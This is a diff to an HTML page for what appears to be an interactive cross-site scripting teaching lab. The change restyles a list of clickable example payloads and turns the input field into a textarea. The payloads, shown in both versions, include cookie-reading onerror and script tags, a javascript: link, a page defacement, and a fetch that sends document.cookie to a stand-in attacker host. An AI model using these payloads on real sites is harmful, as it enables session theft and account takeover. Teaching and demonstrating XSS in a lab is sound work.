@@ -661,17 +661,35 @@ Customer_database.sql</textarea>
     <p class="lab-desc">XSS = attacker's JavaScript runs in <em>your</em> browser. Pick a payload, click <strong>Render (Vulnerable)</strong>, and watch it execute for real — alerts pop up, "cookies" get stolen, the page gets defaced.</p>
 
     <div style="margin-bottom:12px;">
-      <div style="color:var(--muted);font-size:13px;margin-bottom:8px;">🎯 Click a payload to load it (then hit Render Vulnerable):</div>
+      <div style="color:var(--muted);font-size:13px;margin-bottom:8px;">📋 Example payloads — hover to select text and copy, or click 📥 to auto-load into the input:</div>
       <div style="display:grid;gap:6px;">
-        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;script&gt;alert('XSS! Code is running in your browser')&lt;/script&gt;</code>
-        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;img src=x onerror="alert('Stolen cookie: '+document.cookie)"&gt;</code>
-        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;svg onload="document.body.style.background='red';document.title='⚠ HACKED'"&gt;&lt;/svg&gt;</code>
-        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;script&gt;fetch('https://attacker.evil/log?stolen='+encodeURIComponent(document.cookie))&lt;/script&gt;</code>
-        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;a href="javascript:alert('Clicked link → XSS')"&gt;Click for a free iPhone&lt;/a&gt;</code>
+        <div style="display:flex;gap:6px;align-items:stretch;">
+          <code style="flex:1;background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;border:1px solid var(--line);user-select:text;">&lt;script&gt;alert('XSS! Code is running in your browser')&lt;/script&gt;</code>
+          <button class="ghost" style="padding:4px 10px;font-size:12px;" onclick="loadXssPayload(this.previousElementSibling)" title="Load this payload into the input">📥</button>
+        </div>
+        <div style="display:flex;gap:6px;align-items:stretch;">
+          <code style="flex:1;background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;border:1px solid var(--line);user-select:text;">&lt;img src=x onerror="alert('Stolen cookie: '+document.cookie)"&gt;</code>
+          <button class="ghost" style="padding:4px 10px;font-size:12px;" onclick="loadXssPayload(this.previousElementSibling)" title="Load this payload into the input">📥</button>
+        </div>
+        <div style="display:flex;gap:6px;align-items:stretch;">
+          <code style="flex:1;background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;border:1px solid var(--line);user-select:text;">&lt;svg onload="document.body.style.background='red';document.title='⚠ HACKED'"&gt;&lt;/svg&gt;</code>
+          <button class="ghost" style="padding:4px 10px;font-size:12px;" onclick="loadXssPayload(this.previousElementSibling)" title="Load this payload into the input">📥</button>
+        </div>
+        <div style="display:flex;gap:6px;align-items:stretch;">
+          <code style="flex:1;background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;border:1px solid var(--line);user-select:text;">&lt;script&gt;fetch('https://attacker.evil/log?stolen='+encodeURIComponent(document.cookie))&lt;/script&gt;</code>
+          <button class="ghost" style="padding:4px 10px;font-size:12px;" onclick="loadXssPayload(this.previousElementSibling)" title="Load this payload into the input">📥</button>
+        </div>
+        <div style="display:flex;gap:6px;align-items:stretch;">
+          <code style="flex:1;background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;border:1px solid var(--line);user-select:text;">&lt;a href="javascript:alert('Clicked link → XSS')"&gt;Click for a free iPhone&lt;/a&gt;</code>
+          <button class="ghost" style="padding:4px 10px;font-size:12px;" onclick="loadXssPayload(this.previousElementSibling)" title="Load this payload into the input">📥</button>
+        </div>
       </div>
     </div>
 
-    <input type="text" id="xssInput" value="<script>alert('XSS! Code is running in your browser')</script>" />
+    <div style="margin-top:16px;padding:14px;background:var(--bg-2);border-radius:10px;border:2px solid var(--accent);">
+      <label for="xssInput" style="display:block;font-size:13px;font-weight:600;color:var(--accent);margin-bottom:8px;">👉 Your payload (type or paste here):</label>
+      <textarea id="xssInput" rows="3" style="width:100%;background:#0b1020;border:1px solid var(--line);color:var(--ink);padding:10px 12px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:13px;resize:vertical;">&lt;script&gt;alert('XSS! Code is running in your browser')&lt;/script&gt;</textarea>
+    </div>
 
     <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;">
       <button onclick="xssVulnerable()" class="danger">😱 Render (Vulnerable)</button>
